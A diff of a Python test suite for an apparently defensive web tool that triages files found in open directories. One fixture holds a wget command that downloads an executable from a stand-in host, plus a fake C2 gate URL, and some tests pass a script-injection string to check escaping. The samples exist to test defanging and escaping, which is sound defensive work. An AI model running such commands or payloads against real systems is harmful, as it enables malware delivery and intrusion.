@@ -26,7 +26,7 @@ def header_of(html: str) -> str:
     return match.group(1)
 
 
-# -- empty runs ------------------------------------------------------------
+# Empty runs
 
 
 def test_an_empty_index_says_it_was_read_and_lists_nothing(tmp_path: Path):
@@ -78,7 +78,7 @@ def test_a_run_with_entries_carries_no_empty_note(tmp_path: Path):
     assert "Nothing was listed" not in page.text
 
 
-# -- refused targets -------------------------------------------------------
+# Refused targets
 
 
 def test_a_refused_private_target_names_the_box_to_tick(tmp_path: Path):
@@ -99,7 +99,7 @@ def test_a_refused_private_target_names_the_box_to_tick(tmp_path: Path):
     assert "127.0.0.1" not in status  # targets are defanged in the UI
 
 
-# -- navigation ------------------------------------------------------------
+# Navigation
 
 
 def test_a_run_page_links_back_to_the_dashboard(tmp_path: Path):
@@ -130,7 +130,7 @@ def test_the_header_names_the_dashboard_and_the_brand_leads_there(tmp_path: Path
     assert not re.search(r">\s*runs\s*</a>", header)
 
 
-# -- hashes ----------------------------------------------------------------
+# Hashes
 
 
 def run_with_hashes(runs_dir: Path) -> str:
@@ -176,7 +176,7 @@ def test_the_listing_shows_a_hash_and_says_when_a_read_was_partial(tmp_path: Pat
     assert "partial" in page.text
 
 
-# -- the preview panel -----------------------------------------------------
+# The preview panel
 
 
 def run_with_a_family(runs_dir: Path) -> str:
@@ -318,16 +318,25 @@ def test_the_dashboard_counts_what_is_saved(tmp_path: Path):
     assert "indicators" in page.text.lower()
 
 
+def inventory_row(page: str, file_name: str) -> re.Match[str] | None:
+    """One row of the file inventory: a list item marked data-row."""
+    return re.search(
+        r"<li[^>]*data-row[^>]*>(?:(?!</li>).)*" + re.escape(file_name) + r"(?:(?!</li>).)*</li>",
+        page,
+        re.S,
+    )
+
+
 def test_the_listing_flags_a_lying_extension(tmp_path: Path):
     """invoice.pdf that starts with MZ is the most interesting row in the listing."""
     name = run_with_a_family(tmp_path)
     page = TestClient(create_app(tmp_path)).get(f"/runs/{name}")
-    row = re.search(r"<tr[^>]*>(?:(?!</tr>).)*invoice\.pdf(?:(?!</tr>).)*</tr>", page.text, re.S)
+    row = inventory_row(page.text, "invoice.pdf")
     assert row, "invoice.pdf is not in the listing"
     assert "mismatch" in row.group(0).lower()
 
 
-# -- reading the contents --------------------------------------------------
+# Reading the contents
 
 
 def test_the_contents_mark_the_indicators_found_in_them(tmp_path: Path):
@@ -366,7 +375,7 @@ def test_markup_in_a_file_is_shown_not_run(tmp_path: Path):
     assert "&lt;script&gt;" in panel
 
 
-# -- comparing two versions ------------------------------------------------
+# Comparing two versions
 
 
 def run_with_two_versions(runs_dir: Path) -> str:
@@ -422,7 +431,7 @@ def test_versions_kept_as_bytes_say_why_they_cannot_be_compared(tmp_path: Path):
     assert "text" in page.text.lower()
 
 
-# -- asking a public scanner about a hash ----------------------------------
+# Asking a public scanner about a hash
 
 
 def stub_lookup(verdict: Verdict | None = None, calls: list | None = None):
@@ -470,7 +479,7 @@ def test_without_a_key_the_console_says_how_to_set_one(tmp_path: Path):
     assert "DIRSIFT_VT_API_KEY" in panel.text
 
 
-# -- building a rule from a selection --------------------------------------
+# Building a rule from a selection
 
 
 def test_selected_files_build_a_rule(tmp_path: Path):
@@ -516,7 +525,7 @@ def test_a_hash_can_be_opened_in_the_scanner_without_a_key(tmp_path: Path):
     assert "https://www.virustotal.com/gui/file/" + "a" * 64 in panel
 
 
-# -- asking about a hash you already have ----------------------------------
+# Asking about a hash you already have
 
 
 def test_a_pasted_hash_comes_back_with_a_score(tmp_path: Path):
@@ -551,7 +560,7 @@ def test_a_pasted_hash_without_a_key_says_how_to_set_one(tmp_path: Path):
     assert "DIRSIFT_VT_API_KEY" in panel.text
 
 
-# -- which network an address belongs to -----------------------------------
+# Which network an address belongs to
 
 
 def run_with_networks(runs_dir: Path) -> str:
@@ -615,7 +624,7 @@ def test_the_page_says_which_table_answered(tmp_path: Path):
     assert "2026-09-16" in page
 
 
-# -- saying what a note means ----------------------------------------------
+# Saying what a note means
 
 
 def run_with_errors(runs_dir: Path) -> str:
@@ -665,7 +674,7 @@ def test_a_note_with_nothing_to_say_gets_no_marker(tmp_path: Path):
     assert page.count("what this means") == 2
 
 
-# -- an indicator shared between files, and names that are not run names ----
+# An indicator shared between files, and names that are not run names
 
 
 def test_the_preview_lists_an_indicator_the_file_shares_with_another(tmp_path: Path):
@@ -718,7 +727,7 @@ def test_a_refusal_page_escapes_what_it_quotes(tmp_path: Path):
     assert "&lt;script&gt;alert(1)&lt;/script&gt;" in page
 
 
-# -- the keyboard belongs to the page until the listing has focus ----------
+# The keyboard belongs to the page until the listing has focus
 
 STATIC = Path(__file__).resolve().parents[1] / "src" / "dirsift" / "web" / "static"
 
@@ -734,7 +743,7 @@ def keydown_walker() -> str:
 def test_the_listing_rows_carry_the_hook_the_keyboard_walker_reads(tmp_path: Path):
     name = run_with_a_family(tmp_path)
     page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
-    rows = re.search(r"<tbody[^>]*data-listing-rows[^>]*>(.*?)</tbody>", page, re.S)
+    rows = re.search(r"<div[^>]*data-listing-rows[^>]*>(.*)", page, re.S)
     assert rows, "the listing body is not marked for the keyboard walker"
     assert 'data-file-url="http://127.0.0.1:8080/install.bat"' in rows.group(1)
 
@@ -747,7 +756,7 @@ def test_the_arrow_keys_are_left_alone_outside_the_listing():
     assert "index === -1 ? 0" not in walker
 
 
-# -- the preview as a sheet on a narrow screen -----------------------------
+# The preview as a sheet on a narrow screen
 
 
 def test_the_preview_sits_in_a_sheet_that_says_how_to_get_back(tmp_path: Path):
@@ -755,8 +764,11 @@ def test_the_preview_sits_in_a_sheet_that_says_how_to_get_back(tmp_path: Path):
     page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
     sheet = re.search(r"<div[^>]*data-sheet[^>]*>(.*)", page, re.S)
     assert sheet, "the preview column is not marked as a sheet"
-    close = r"<button[^>]*data-sheet-close[^>]*>\s*Back to files\s*</button>"
-    assert re.search(close, sheet.group(1))
+    close = (
+        r"<button[^>]*data-sheet-close[^>]*>"
+        r"(?:(?!</button>).)*Back to files(?:(?!</button>).)*</button>"
+    )
+    assert re.search(close, sheet.group(1), re.S)
     assert 'id="preview"' in sheet.group(1)
 
 
@@ -779,9 +791,16 @@ def test_without_script_the_sheet_stays_in_the_page(tmp_path: Path):
     assert ".js .preview-column" in css
 
 
-# -- the run page as a workbench -------------------------------------------
+# The run page as a case file
+#
+# The run reads top to bottom as one document: 01 Identity, 02 Drivers, 03
+# Inventory, 04 Indicators, 05 Detections, 06 Run settings, with a section menu
+# that tracks the reader. Nothing is hidden behind a tab any more, so the old
+# ?tab= keys (files, indicators, families, notes, settings) are anchors in the
+# page and an old link lands on its part.
 
 RUN_TABS = ("files", "indicators", "families", "notes", "settings")
+SECTIONS = ("identity", "drivers", "files", "indicators", "detections", "settings")
 
 
 def panel_of(page: str, tab: str) -> str:
@@ -790,10 +809,15 @@ def panel_of(page: str, tab: str) -> str:
     return match.group(0)
 
 
+def landing(page: str) -> list[str]:
+    """The part an old ?tab= link asked for, as the page marks it for the script."""
+    return re.findall(r'data-land="(\w+)"', page)
+
+
 def test_the_run_opens_on_a_summary_strip_with_the_numbers(tmp_path: Path):
     name = run_with_networks(tmp_path)
     page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
-    strip = re.search(r'<section[^>]*class="run-summary"[^>]*>(.*?)</section>', page, re.S)
+    strip = re.search(r'<section[^>]*class="run-summary[^"]*"[^>]*>(.*?)</section>', page, re.S)
     assert strip, "no summary strip"
     body = strip.group(1)
     assert re.search(r"<h1[^>]*>\s*hxxp://203\[\.\]0\[\.\]113\[\.\]24/files/\s*</h1>", body)
@@ -806,39 +830,48 @@ def test_the_run_opens_on_a_summary_strip_with_the_numbers(tmp_path: Path):
 def test_a_missing_value_in_the_strip_says_none_not_a_dash(tmp_path: Path):
     name = save_run(tmp_path, ScanResult(root_url="http://127.0.0.1:8080/"))
     page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
-    strip = re.search(r'<section[^>]*class="run-summary"[^>]*>(.*?)</section>', page, re.S)
+    strip = re.search(r'<section[^>]*class="run-summary[^"]*"[^>]*>(.*?)</section>', page, re.S)
     assert strip
     assert not re.search(r"<dd[^>]*>\s*-\s*</dd>", strip.group(1))
     assert re.search(r"<dd[^>]*>\s*<span class=\"none\">none</span>\s*</dd>", strip.group(1))
 
 
-def test_every_part_of_the_run_has_a_tab_and_a_section(tmp_path: Path):
-    """Without the script the tabs are anchors and every section is on the page."""
+def test_every_part_of_the_run_has_an_anchor_and_a_section(tmp_path: Path):
+    """The section menu is a list of anchors, so without the script it still jumps,
+    and every old tab key still names a part of the page."""
     name = run_with_a_family(tmp_path)
     page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
-    nav = re.search(r"<nav[^>]*data-run-tabs[^>]*>(.*?)</nav>", page, re.S)
-    assert nav, "no tab bar"
+    nav = re.search(r"<nav[^>]*data-run-sections[^>]*>(.*?)</nav>", page, re.S)
+    assert nav, "no section menu"
+    for number, section in enumerate(SECTIONS, start=1):
+        link = re.search(rf'<a[^>]*href="#{section}"[^>]*>(.*?)</a>', nav.group(1), re.S)
+        assert link, section
+        assert f"0{number}" in link.group(1), section
+        panel_of(page, section)
     for tab in RUN_TABS:
-        assert re.search(rf'<a[^>]*href="#{tab}"', nav.group(1)), tab
         panel_of(page, tab)
-    files_tab = re.search(r'<a[^>]*href="#files"[^>]*>(.*?)</a>', nav.group(1), re.S)
-    assert files_tab and ">4<" in files_tab.group(1).replace(" ", "")
+    inventory = re.search(r'<h2[^>]*id="files-title"[^>]*>(.*?)</h2>', page, re.S)
+    assert inventory and "4 files" in inventory.group(1)
 
 
-def test_the_tab_in_the_address_bar_is_the_one_shown_first(tmp_path: Path):
+def test_an_old_tab_link_lands_on_its_part(tmp_path: Path):
     name = run_with_errors(tmp_path)
     client = TestClient(create_app(tmp_path))
-    for asked, shown in (("notes", "notes"), (None, "files"), ("nonsense", "files")):
+    cases = (("notes", ["notes"]), ("families", ["families"]), (None, []), ("nonsense", []))
+    for asked, landed in cases:
         params = {"tab": asked} if asked else {}
         page = client.get(f"/runs/{name}", params=params).text
-        current = re.findall(r'<section[^>]*class="run-panel is-current"[^>]*id="(\w+)"', page)
-        assert current == [shown], (asked, current)
+        assert landing(page) == landed, (asked, landing(page))
+    # Every part is on the page whatever was asked: nothing is hidden by a tab.
+    page = client.get(f"/runs/{name}", params={"tab": "notes"}).text
+    assert "run-panel is-current" not in page
+    for section in SECTIONS:
+        panel_of(page, section)
 
 
-def test_a_file_in_the_address_bar_forces_the_files_tab(tmp_path: Path):
-    """A shared ?file= link means a preview, and the preview lives in the files
-    panel. Whatever ?tab= rode along, the files panel is the one shown, so the
-    preview is never stranded in a hidden panel (a narrow-screen page lock)."""
+def test_a_file_in_the_address_bar_opens_the_preview_not_a_section(tmp_path: Path):
+    """A shared ?file= link means a preview. Whatever ?tab= rode along, the page
+    does not jump to a section under the preview: the preview opens instead."""
     name = run_with_a_family(tmp_path)
     opened = "http://127.0.0.1:8080/install.bat"
     client = TestClient(create_app(tmp_path))
@@ -847,23 +880,62 @@ def test_a_file_in_the_address_bar_forces_the_files_tab(tmp_path: Path):
         if asked:
             params["tab"] = asked
         page = client.get(f"/runs/{name}", params=params).text
-        current = re.findall(r'<section[^>]*class="run-panel is-current"[^>]*id="(\w+)"', page)
-        assert current == ["files"], (asked, current)
-        tabs = re.findall(r'<a class="run-tab is-current"[^>]*data-tab="(\w+)"', page)
-        assert tabs == ["files"], (asked, tabs)
-    # Without ?file=, ?tab= still decides the panel.
+        assert landing(page) == [], (asked, landing(page))
+        sheet = re.search(r"<div[^>]*data-sheet[^>]*>", page)
+        assert sheet and "data-sheet-open" in sheet.group(0), asked
+        assert "d" * 32 in page
+    # Without ?file=, ?tab= still decides where the page lands.
     notes_only = client.get(f"/runs/{name}", params={"tab": "notes"}).text
-    assert re.findall(
-        r'<section[^>]*class="run-panel is-current"[^>]*id="(\w+)"', notes_only
-    ) == ["notes"]
+    assert landing(notes_only) == ["notes"]
+    plain = re.search(r"<div[^>]*data-sheet[^>]*>", notes_only)
+    assert plain and "data-sheet-open" not in plain.group(0)
 
 
-def test_the_listing_and_the_preview_share_the_files_tab(tmp_path: Path):
+def test_the_inventory_and_the_preview_dialog_are_both_on_the_page(tmp_path: Path):
+    """The inventory carries the rows; the preview is a dialog outside every
+    section, so it floats over the inventory instead of taking its width."""
     name = run_with_a_family(tmp_path)
     page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
     files = panel_of(page, "files")
     assert "data-listing-rows" in files
-    assert 'id="preview"' in files
+    assert 'id="preview"' not in files
+    sheet = re.search(r'<div[^>]*id="preview-sheet"[^>]*>(.*)', page, re.S)
+    assert sheet and 'id="preview"' in sheet.group(1)
+
+
+def test_a_file_opens_from_a_link_that_works_without_script(tmp_path: Path):
+    """Each file name is a real link to ?file=, which the server renders with the
+    preview in the page, so a reader without the script still gets the file."""
+    name = run_with_a_family(tmp_path)
+    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
+    row = inventory_row(page, "install.bat")
+    assert row
+    link = re.search(
+        r'<a[^>]*data-file-url="http://127.0.0.1:8080/install.bat"[^>]*>', row.group(0)
+    )
+    assert link, "the file name is not a link"
+    href = f'href="/runs/{name}?file=http%3A//127.0.0.1%3A8080/install.bat#preview-sheet"'
+    assert href in link.group(0)
+    assert "hx-get=" in link.group(0)
+
+
+def test_the_full_sha256_stays_out_of_the_inventory(tmp_path: Path):
+    """The listing used to scroll sideways on the full digest. The row shows the
+    short form; the full digest is in the preview."""
+    name = run_with_hashes(tmp_path)
+    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
+    row = inventory_row(page, "run.bat")
+    assert row
+    assert "a" * 12 in row.group(0)
+    assert ">" + "a" * 64 + "<" not in row.group(0)
+
+
+def test_the_inventory_is_grouped_by_kind(tmp_path: Path):
+    name = run_with_a_family(tmp_path)
+    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
+    files = panel_of(page, "files")
+    groups = re.findall(r'<details[^>]*class="grp"[^>]*data-kind="(\w+)"', files)
+    assert sorted(groups) == ["pe", "script"]
 
 
 def test_drivers_ride_on_the_listing_instead_of_a_card(tmp_path: Path):
@@ -872,7 +944,7 @@ def test_drivers_ride_on_the_listing_instead_of_a_card(tmp_path: Path):
     assert "What drives the rest" not in page
     strip = re.search(r"<ol[^>]*data-drivers[^>]*>(.*?)</ol>", page, re.S)
     assert strip and "install.bat" in strip.group(1)
-    row = re.search(r"<tr[^>]*>(?:(?!</tr>).)*install\.bat(?:(?!</tr>).)*</tr>", page, re.S)
+    row = inventory_row(page, "install.bat")
     assert row and 'class="driver-badge"' in row.group(0)
 
 
@@ -925,30 +997,25 @@ def test_an_empty_tab_says_so_in_one_sentence(tmp_path: Path):
 
 def test_a_tab_the_page_does_not_have_is_never_echoed_back(tmp_path: Path):
     """?tab= is only compared against the known parts; whatever else arrives is
-    dropped, never written into the page, and the files tab is shown."""
+    dropped, never written into the page, and the page lands nowhere."""
     name = run_with_errors(tmp_path)
     client = TestClient(create_app(tmp_path))
     hostile = '"><script>alert(1)</script>'
     for asked in (hostile, "NOTES", "notes ", "files#notes", "../notes"):
         response = client.get(f"/runs/{name}", params={"tab": asked})
         assert response.status_code == 200, asked
-        current = re.findall(
-            r'<section[^>]*class="run-panel is-current"[^>]*id="(\w+)"', response.text
-        )
-        assert current == ["files"], (asked, current)
+        assert landing(response.text) == [], asked
     page = client.get(f"/runs/{name}", params={"tab": hostile}).text
     assert "<script>alert(1)" not in page
     assert "alert(1)" not in page
 
 
-def test_a_repeated_tab_shows_exactly_one_part(tmp_path: Path):
+def test_a_repeated_tab_lands_on_one_part_at_most(tmp_path: Path):
     name = run_with_errors(tmp_path)
     page = TestClient(create_app(tmp_path)).get(f"/runs/{name}?tab=notes&tab=families").text
-    current = re.findall(r'<section[^>]*class="run-panel is-current"[^>]*id="(\w+)"', page)
-    assert len(current) == 1
-    assert current[0] in ("notes", "families")
-    tabs = re.findall(r'<a class="run-tab is-current"[^>]*data-tab="(\w+)"', page)
-    assert tabs == current
+    landed = landing(page)
+    assert len(landed) <= 1
+    assert set(landed) <= {"notes", "families"}
 
 
 def test_the_server_and_the_page_agree_on_the_tabs():
@@ -957,7 +1024,7 @@ def test_the_server_and_the_page_agree_on_the_tabs():
 
     assert served == RUN_TABS
 
-# -- a file that is not in the run -----------------------------------------
+# A file that is not in the run
 
 GONE = "http://127.0.0.1:8080/gone.exe"
 
@@ -1020,7 +1087,7 @@ def test_a_miss_never_asks_the_scanner(tmp_path: Path):
     TestClient(app).post(f"/runs/{name}/verdict", params={"url": GONE})
     assert asked == []
 
-# -- driver scores come from the server, not from the strip ----------------
+# Driver scores come from the server, not from the strip
 
 
 def test_every_scored_driver_gets_its_badge_not_only_the_first_six(tmp_path: Path):
@@ -1051,14 +1118,14 @@ def test_a_badge_and_the_strip_show_the_same_rounded_score(tmp_path: Path):
     strip = re.search(r"<ol[^>]*data-drivers[^>]*>(.*?)</ol>", page, re.S)
     assert strip
     in_strip = re.search(r'class="driver-score">.*?</span>\s*(\d+)\s*</span>', strip.group(1), re.S)
-    row = re.search(r"<tr[^>]*>(?:(?!</tr>).)*install\.bat(?:(?!</tr>).)*</tr>", page, re.S)
+    row = inventory_row(page, "install.bat")
     assert row
     badge = re.search(r'class="driver-badge">.*?</span>\s*(\d+)\s*</span>', row.group(0), re.S)
     assert in_strip and badge
     assert in_strip.group(1) == badge.group(1)
 
 
-# -- templated error and "gone" pages (N1) ---------------------------------
+# Templated error and "gone" pages (N1)
 #
 # Five return points used to answer with a bare body (a lone <h1>, or the single
 # word "gone") that failed axe on document-title, html-has-lang and the main
@@ -1183,7 +1250,7 @@ def test_a_refusal_is_a_templated_full_page_that_keeps_the_quote_escaped(tmp_pat
     assert "&amp;lt;" not in html  # no double escape
 
 
-# -- the scan page keeps its live region through the swap (E6) --------------
+# The scan page keeps its live region through the swap (E6)
 
 
 def start_a_failing_scan(client: TestClient) -> str:
@@ -1220,3 +1287,134 @@ def test_a_finished_scan_status_does_not_schedule_another_poll(tmp_path: Path):
     assert "failed" in body
     assert "hx-get" not in body
     assert "hx-trigger" not in body
+
+# Keyboard hints sit where the keys work
+
+
+def section_of(page: str, key: str) -> str:
+    match = re.search(rf'<section[^>]*id="{key}"[^>]*>.*?(?=<section class="case-sec")', page, re.S)
+    assert match, f"no {key} section on the page"
+    return match.group(0)
+
+
+def plain(html: str) -> str:
+    return " ".join(re.sub(r"<[^>]+>", " ", html).split())
+
+
+def test_the_top_bar_carries_no_keyboard_hint(tmp_path: Path):
+    """j and k only work in the inventory and in the file dialog, so the bar
+    that sits over the whole page does not advertise them."""
+    name = run_with_a_family(tmp_path)
+    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
+    top = header_of(page)
+    assert "kbd" not in top
+    assert "move the files" not in page
+
+
+def test_the_inventory_says_which_keys_walk_it(tmp_path: Path):
+    name = run_with_a_family(tmp_path)
+    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
+    inventory = section_of(page, "files")
+    hint = re.search(r'<p[^>]*class="[^"]*\bkeys\b[^"]*"[^>]*>(.*?)</p>', inventory, re.S)
+    assert hint, "the inventory has no keyboard hint"
+    assert "js-only" in hint.group(0), "the keys only work with script on"
+    assert plain(hint.group(1)) == "j and k for the next and previous file, Enter to open it."
+    assert "<kbd>j</kbd>" in hint.group(1) and "<kbd>k</kbd>" in hint.group(1)
+    assert "Press j" not in page  # the old hint under the list said it twice
+
+
+def test_no_page_draws_a_key_as_a_button():
+    """A key in running text is the mono face and nothing else: no box, no fill."""
+    css = (STATIC / "dirsift.css").read_text(encoding="utf-8")
+    assert ".kbd" not in css
+    rule = re.search(r"(?m)^kbd\s*\{([^}]*)\}", css)
+    assert rule, "no rule for kbd"
+    body = rule.group(1)
+    for prop in ("border", "background", "box-shadow", "padding"):
+        assert not re.search(rf"(?m)^\s*{prop}[\w-]*\s*:", body), prop
+    templates = Path(STATIC).parent / "templates"
+    for template in templates.glob("*.html"):
+        assert 'class="kbd"' not in template.read_text(encoding="utf-8"), template.name
+
+
+# Context lines on the run page are defanged as they are drawn
+
+
+def run_with_live_context(runs_dir: Path) -> str:
+    """A config whose lines hold the shapes the context pass once left live:
+    an e-mail, a bracketed IPv6, a host with a port and a path, a .co name."""
+    source = "http://127.0.0.1:8080/cfg.txt"
+    text = "\n".join(
+        [
+            "mail ops@evil-mail.co for the key",
+            "bind [2001:db8:85a3::8a2e:370:7334]:443",
+            "c2=panel.evil.co:8443/gate.php",
+            "wget http://203.0.113.9:8080/drop/a.exe -O /tmp/a",
+            "fallback 198.51.100.4 and updates.example.top",
+        ]
+    )
+    entry = Entry(
+        url=source,
+        name="cfg.txt",
+        depth=1,
+        kind="config",
+        confidence="sniffed",
+        fetched_bytes=len(text),
+        size=len(text),
+        text_preview=text,
+    )
+    return save_run(
+        runs_dir,
+        ScanResult(root_url="http://127.0.0.1:8080/", listing_flavor="python", entries=[entry]),
+    )
+
+
+def test_a_context_line_shows_nothing_live(tmp_path: Path):
+    from dirsift.analyze import analyze
+    from dirsift.detections import live_values
+
+    name = run_with_live_context(tmp_path)
+    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
+    timeline = re.search(r'<ol class="timeline"[^>]*>(.*?)</ol>', page, re.S)
+    assert timeline, "no indicator timeline"
+    body = timeline.group(1)
+    saved = ScanResult.model_validate_json((tmp_path / f"{name}.json").read_text("utf-8"))
+    result, _ = analyze(saved)
+    assert len(result.iocs) >= 5
+    live = [value for value in live_values(result) if value in body]
+    assert live == []
+    assert 'class="tl-c data"' in body  # the context lines are still drawn
+
+
+def test_every_class_the_run_page_leans_on_has_a_rule():
+    """The section menu, the key hint and the include pills are styled, so a
+    stylesheet edit that drops one of their rules fails here and not on screen."""
+    css = (STATIC / "dirsift.css").read_text(encoding="utf-8")
+    for selector in (".spy-band {", ".spy {", ".spy a", ".keys {", "kbd {", ".skip-link {"):
+        assert selector in css, selector
+
+
+# The mark in the tab and in the bar
+
+
+def test_every_page_names_its_tab_icon(tmp_path: Path):
+    client = TestClient(create_app(tmp_path))
+    head = client.get("/").text.split("</head>", 1)[0]
+    assert '<link rel="icon" href="/static/favicon.svg" type="image/svg+xml">' in head
+    assert '<link rel="icon" href="/static/favicon-32.png" sizes="32x32" type="image/png">' in head
+    icon = client.get("/static/favicon.svg")
+    assert icon.status_code == 200
+    assert icon.headers["content-type"].startswith("image/svg+xml")
+    assert client.get("/static/favicon-32.png").status_code == 200
+
+
+def test_the_logo_link_says_where_it_goes_and_hides_the_drawing(tmp_path: Path):
+    header = header_of(TestClient(create_app(tmp_path)).get("/").text)
+    brand = re.search(r'<a[^>]*class="brand"[^>]*>(.*?)</a>', header, re.S)
+    assert brand, "no logo link"
+    assert 'aria-label="DirSift dashboard"' in brand.group(0)
+    svg = re.search(r"<svg[^>]*>", brand.group(1))
+    assert svg and 'aria-hidden="true"' in svg.group(0)
+    assert 'viewBox="0 0 16 16"' in svg.group(0)
+    assert 'class="brand-band"' in brand.group(1)
+    assert "DIRSIFT" in brand.group(1)
